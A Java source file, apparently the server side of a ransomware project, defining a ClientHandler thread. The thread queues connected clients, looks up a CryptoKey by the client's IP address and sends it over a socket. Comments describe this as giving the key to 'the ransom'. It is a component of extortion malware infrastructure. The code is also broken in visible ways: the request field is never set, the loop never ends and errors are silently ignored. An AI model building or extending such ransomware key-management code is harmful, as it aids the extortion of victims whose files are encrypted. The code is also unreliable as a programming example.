package server.networking;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;
import javax.inject.Inject;
import javax.servlet.http.HttpServletRequest;

import lombok.Getter;
import lombok.Setter;
import server.entities.CryptoKey;
import server.repositories.KeyRepository;

@Getter
@Setter
public class ClientHandler extends Thread {
	
	@Inject
	private KeyRepository repository;
	private HttpServletRequest request;
	private Monitor monitor;
	private final Socket client;
	private final ObjectOutputStream os;


	public ClientHandler(Socket cl, ObjectOutputStream oos) {
		client = cl;
		os = oos;
	}

	@Override
	public void run() {

		super.run();

		// Other clients wait for their turn
		monitor.waitForMyTurn(client);

		// Giving the key to the ransom
		while (true) {
			try {
				CryptoKey key = repository.findById(request.getRemoteAddr()).get();
				os.writeObject(key);

				// Ransom got the key and therefore notifies all other clients
				monitor.imDone(client);
			} catch (NullPointerException | IOException e) {
			}
		}
	}
}